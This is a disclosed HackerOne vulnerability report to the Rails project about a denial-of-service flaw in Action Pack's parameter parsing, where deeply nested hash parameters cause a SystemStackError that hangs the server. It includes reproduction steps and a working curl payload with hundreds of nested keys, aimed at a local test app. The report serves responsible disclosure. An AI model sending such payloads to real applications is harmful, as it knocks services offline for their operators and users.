# Denial of Service in Action Pack Exception Handling

## Report Details
- **Report ID**: 42797
- **URL**: https://hackerone.com/reports/42797
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-01-07T20:01:46.370Z
- **Disclosed**: 2015-06-16T21:56:27.776Z

## Reporter
- **Username**: ff7f00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
# Severity

Medium

# Impact

Attackers can cause an application to be unreachable, causing a denial of service condition.

# Details

When a Rails application receives a request with either body or query parameters, these parameters are converted to a params hash. Hashes can be passed to the application in the form of user[name]=foo&user[address]=bar. Action Pack will then convert this into a hash in the form of `{ user[:name] => "foo", user[:address] => "bar" }`. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.

This was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.

Production Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.

# Bug Notes

It seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It's possible that a loop is being hit here every time the SystemStackError occurs.

I set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set 'catch SystemStackError'. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.

# Reproduction Steps

For Webrick:

1. rails new dos_test
2. cd dos_test
3. bundle exec rails generate controller welcome index
4. Uncomment the `root 'welcome#index'` line in config/routes.rb
5. SECRET_KEY_BASE='foo' bundle exec rails s -e production
6. Then in a separate window, run the following cURL command:

```
curl -i -s -k  -X 'GET' \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data-binary $'foo[a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a]=bar' \
'http://localhost:3000/'
```

Note that Webrick will hang and will have to be killed manually. If the Webrick server handles this level of nesting, more nesting levels can be created by adding [a] until the application hangs.

If you have any questions at all or need clarification, I’d be happy to help.

## Attachments
No attachments
